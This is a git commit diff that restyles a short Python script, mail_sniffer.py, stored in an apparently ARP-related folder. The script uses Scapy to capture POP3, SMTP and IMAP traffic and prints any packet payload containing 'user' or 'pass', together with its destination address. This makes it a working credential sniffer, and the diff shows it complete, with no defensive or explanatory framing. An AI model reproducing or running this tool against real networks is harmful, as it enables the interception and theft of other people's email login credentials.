7b63b7cd9ea61e7d3ecbbde318410d39b074561b
fToxicw <ftoxicw@163.com>
2022-06-30 13:37:46 +0800

    Update mail_sniffer.py

--- ARP/mail_sniffer.py
+++ ARP/mail_sniffer.py
@@ -1,24 +1,25 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 '''
-Simple Mail sniffing with Scapy using BPF syntax.
+Simple Mail sniffing.
 '''
 # Import Scapy
 from scapy.all import sniff, TCP, IP
 
-# The packet callback
+
 def packet_callback(packet):
+    '''
+    Packet callback.
+    '''
     if packet[TCP].payload:
         mypacket = str(packet[TCP].payload)
         if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
             print(f"[*] Destination: {packet[IP].dst}")
             print(f"[*] {str(packet[TCP].payload)}")
 
+
 def main():
     # Fire up the sniffer
     sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
 
+
 if __name__ == '__main__':
     main()
-
